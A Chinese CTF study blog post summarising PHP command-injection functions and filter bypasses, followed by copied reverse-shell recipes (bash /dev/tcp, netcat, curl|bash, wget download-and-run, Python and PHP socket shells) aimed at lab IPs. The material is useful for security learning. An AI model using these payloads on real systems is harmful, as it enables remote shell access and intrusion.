<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="liduoan.efls">
    
    <title>
        
            命令执行-总结1.0 |
        
        liduoan修炼笔记
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","favicon":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","avatar":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","font_size":null,"font_family":"STSong","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"世之奇伟、瑰怪，非常之观，常在于险远 || 而人之所罕至焉，故非有志者不能至也","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
                </a>
            
            <a class="logo-title" href="/">
               liduoan修炼笔记
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">命令执行-总结1.0</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">liduoan.efls</span>
                            
                                <span class="author-label">Lv4</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2020-04-08 14:36:02</span>
        <span class="mobile">2020-04-08 14:36</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2020-04-13 00:07:56</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>2.3k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>8 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h2 id="2020-04-08"><a href="#2020-04-08" class="headerlink" title="2020.04.08"></a>2020.04.08</h2><p>现在在上马原课。不是很想听，或者说根本不想听。</p>
<p>刚好看到了合天的一个公众号写了命令注入的总结。</p>
<p>我想着，就花点时间写写看√</p>
<p>首先，我想说说命令注入的重要性。</p>
<p>命令注入，很多时候都需要使用到，我做过的题目里好多都是利用命令注入的。</p>
<p>可以说是基础的东西吧！基础很重要。</p>
<p>有一说一其实就那几个函数使用。</p>
<p>首先区分命令注入和远程代码执行</p>
<p>命令注入是调用了系统的命令。</p>
<span id="more"></span>

<p>远程代码执行是利用代码在服务器中执行。但是就我而言，我觉得两者是相关的。</p>
<p><strong>命令执行原理：</strong></p>
<p>  在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令</p>
<p><strong>代码执行原理：</strong></p>
<p> 调用一些执行系统命令的函数，如PHP中的system、exec、<strong>assert</strong>、shell_exec、passthru、popen、pcntl_exec等。</p>
<p>当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行，这就是命令执行漏洞。以上函数主要也在webshell中用的多，实际上在正常应用中差别不太大，用得最多的还是几个而已。</p>
<p>所以介绍介绍用的最多的函数叭！【干巴得 马原老师太捞了！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151245166.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>看到没！ system会自己显示输出的！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151301430.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>exec函数就不会自动自己显示输出了。需要我们认为调用函数</p>
<p>echo()、var_dump()等等</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151656770.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>下面是一些和上面比更有趣的函数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151819571.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>这个函数是做过一道题目的！所以详细说说这个函数</p>
<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。 <code>assertion</code> 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 <code>assertion</code> 表达式。 这意味着如果你传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的 <a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert-options.php" >assert_options()<i class="fas fa-external-link-alt"></i></a> 处理函数时，条件会转换为字符串，而布尔值 <strong><code>FALSE</code></strong> 会被转换成空字符串。</p>
<p><strong>记住！</strong>是当成php代码！不是当成系统命令！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408152108977.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>这个又得说到了正则表达式。它是怎么利用的呢？</p>
<p>emm说实话，我理解的不深，还是不献丑了</p>
<p>大家先知道，存在这个方式的代码执行</p>
<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557" >https://xz.aliyun.com/t/2557<i class="fas fa-external-link-alt"></i></a></p>
<p>当然还有很多有意思的函数可以进行命令执行。</p>
<p>在我们找到函数后，去利用的时候，经常会对参数进行过滤。</p>
<p>那么我们需要绕过它。【怎么绕过？？…</p>
<p><strong>补充：</strong> 反引号可以进行命令执行</p>
<p>一般来说：绕过方式无非</p>
<p>1、禁用函数</p>
<p>2、过滤字符</p>
<p>禁用函数的我不懂，先放着。</p>
<p>说说过滤字符</p>
<p>过滤了空格:用哪些代替？ 【要耐心，有时候不是都可以成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、 &lt;</span><br><span class="line">2、$&#123;IFS&#125;</span><br><span class="line">3、$IFS$9</span><br><span class="line">4、%09</span><br></pre></td></tr></table></figure>

<p>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离  –源自合天智汇</p>
<p>过滤了某些截断符号：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ; | (  )  `(反引号)  ||  &amp;&amp; &amp; &#125;  &#123;  %<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<p>利用Base64编码绕过【我暂时还没遇到过</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">root@kali: <span class="title">echo</span> &#x27;<span class="title">cat</span>&#x27; | <span class="title">base64</span></span></span><br><span class="line"><span class="function"><span class="title">Y2F0Cg</span>==</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>: <span class="title">echo</span> &#x27;<span class="title">Y2F0Cg</span>==&#x27; | <span class="title">base64</span> -<span class="title">d</span> </span></span><br></pre></td></tr></table></figure>

<p>用单引号绕过特定字符</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408155323372.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>动态调用：</p>
<p>PHP中允许动态调用函数比如说：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$fun</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么在我们可以利用多个变量，动态组成字符串绕过过滤√</p>
<p>好了，终于到了我最不会的反弹shell了</p>
<p>这个我服气。老多问题了。但是理清楚一点点了。</p>
<p>周五早上写清楚。</p>
<hr>
<p>首先要搞清楚什么是反弹，为什么要反弹。<br>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
<p>那么什么情况下正向连接不太好用了呢？<br>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。<br>2.由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br>3.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<p>此处源自：<a class="link"   target="_blank" rel="noopener" href="https://www.zhihu.com/question/24503813/answer/102253018" >https://www.zhihu.com/question/24503813/answer/102253018<i class="fas fa-external-link-alt"></i></a></p>
<p>在CTF中，我们是使目标机访问我们的服务器，然后访问我们预先写好的代码。</p>
<p>这也目标机会反弹自己的shell到我们的服务器了。</p>
<p>典型的是：<a class="link"   target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2097.html#DuangShell" >https://www.gem-love.com/ctf/2097.html#DuangShell<i class="fas fa-external-link-alt"></i></a></p>
<p>下面copy一下一位师傅的博客：<a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/9456473a0a14" >https://www.jianshu.com/p/9456473a0a14<i class="fas fa-external-link-alt"></i></a></p>
<p>最近在做ctf题时碰到一些命令执行题借用命令执行来反弹shell，这里记录一下。</p>
<h2 id="1-bash反弹shell"><a href="#1-bash反弹shell" class="headerlink" title="1.bash反弹shell"></a>1.bash反弹shell</h2><p>个人感觉bash反弹是最简单、也是最常见的一种。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.20.151/</span><span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>bash一句话命令详解</strong><br> 以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-4897e8586a1ebeb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/875/format/webp"
                      alt="img"
                ></p>
<p> 其实以上bash反弹一句完整的解读过程就是：</p>
<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。<br> 在反弹shell时要借助netcat工具反弹</p>
<p>Netcat 一句话反弹：Netcat反弹也是非常常用的方法，只是这个方法需要我们手动去安装一个NC环境</p>
<p><strong>开启外网主机监听</strong></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -lvvp 8080</span></span><br><span class="line">listening on [any] <span class="number">8080</span> ...</span><br></pre></td></tr></table></figure>

<p>kali : 192.168.20.151<br> centos：192.168.20.130</p>
<p>先用kali开启监听：<br> 然后centos执行bash一句话。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-8a2be7a5ac2532b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/611/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-f92bef119eba0444.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/612/format/webp"
                      alt="img"
                ></p>
<p>成功反弹。</p>
<h2 id="2-netcat-一句话反弹"><a href="#2-netcat-一句话反弹" class="headerlink" title="2.netcat 一句话反弹"></a>2.netcat 一句话反弹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~  nc 192.168.31.151 7777 -t  /bin/bash</span><br><span class="line"> 命令详解：通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.151）。</span><br></pre></td></tr></table></figure>

<p>先开启监听7777端口。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-26d6a61c8a6bdcaf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/551/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-958ec9dabbc930ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/622/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-748a5254be4165ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/569/format/webp"
                      alt="img"
                ></p>
<p>交互式反弹</p>
<h2 id="3-curl反弹shell"><a href="#3-curl反弹shell" class="headerlink" title="3.curl反弹shell"></a>3.curl反弹shell</h2><p>前提要利用bash一句话的情况下使用curl反弹shell</p>
<p>在存在命令执行的服务器上执行<code>curl ip|bash</code>，该ip的index文件上含有bash一句话，就可以反弹shell。</p>
<p>例如在自己的服务器index上写上一句话</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.20.151/</span><span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>192.168.20.151就是作为监听端口的服务器用来得到反弹的shell。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-a63c295a1e63aff0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/428/format/webp"
                      alt="img"
                ></p>
<p>存在一句话，利用curl反弹。<br> kali开启监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-5eb371df51540d22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/645/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-a850356eb6ed3014.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/668/format/webp"
                      alt="img"
                ></p>
<h2 id="4-wget方式反弹"><a href="#4-wget方式反弹" class="headerlink" title="4.wget方式反弹"></a>4.wget方式反弹</h2><p>利用wget进行下载执行</p>
<blockquote>
<p>wget 192.168.20.130&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php</p>
</blockquote>
<p>利用下面贴出的php进行反弹。<br> 开启监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-bf1e2b4edcdf28db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/661/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-885c10d962ca43fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/691/format/webp"
                      alt="img"
                ></p>
<p>成功反弹shell</p>
<h2 id="5-其他脚本反弹"><a href="#5-其他脚本反弹" class="headerlink" title="5.其他脚本反弹"></a>5.其他脚本反弹</h2><h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3><p>开启kail监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-ea48849e495003eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/658/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-bbcd7bf41dd98e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/665/format/webp"
                      alt="img"
                ></p>
<p>反弹成功。<br> py脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.20.151&quot;</span>,<span class="number">7777</span>)) <span class="comment">#更改localhost为自己的外网ip,端口任意</span></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>

<h3 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h3><p>开启kail监听端口，</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-444bfa06b7da605b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/674/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-e18a534cd266a1db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/641/format/webp"
                      alt="img"
                ></p>
<p>成功反弹，不过这里要将php保存成txt文件进行反弹，若为php文件不会反弹成功。<br> php脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.20.151&quot;</span>,<span class="number">7777</span>);<span class="comment">//localhost为自己的外网ip，端口任意</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反弹shell我大致上了解了。但是很浅薄。</p>
<p>等我又遇到这样的题目再说叭。</p>

            </div>

            
                <div class="post-copyright-info">
                    
<div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li class="post-title">
            <span class="type">本文标题</span>：<span class="content">命令执行-总结1.0</span>
        </li>
        <li class="post-author">
            <span class="type">本文作者</span>：<span class="content">liduoan.efls</span>
        </li>
        <li class="post-time">
            <span class="type">创建时间</span>：<span class="content">2020-04-08 14:36:02</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2020/04/08/CTFcomig/命令执行-总结1-0/</span>
        </li>
        <li class="post-license">
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                </div>
            

            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2020/04/11/%E5%9B%9B%E6%9C%88/%E6%97%A0%E6%95%B0%E5%AD%97%E6%97%A0%E5%AD%97%E6%AF%8DRCE/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">无数字无字母RCE</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2020/04/08/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E4%BB%BD%E5%AE%89%E5%85%A8-2/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">四月份安全-2</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-04-08"><span class="nav-number">1.</span> <span class="nav-text">2020.04.08</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-bash%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.</span> <span class="nav-text">1.bash反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-netcat-%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9"><span class="nav-number">3.</span> <span class="nav-text">2.netcat 一句话反弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-curl%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.</span> <span class="nav-text">3.curl反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-wget%E6%96%B9%E5%BC%8F%E5%8F%8D%E5%BC%B9"><span class="nav-number">5.</span> <span class="nav-text">4.wget方式反弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E5%85%B6%E4%BB%96%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9"><span class="nav-number">6.</span> <span class="nav-text">5.其他脚本反弹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python%E5%8F%8D%E5%BC%B9"><span class="nav-number">6.1.</span> <span class="nav-text">python反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8F%8D%E5%BC%B9"><span class="nav-number">6.2.</span> <span class="nav-text">php反弹</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2020</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">liduoan.efls</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
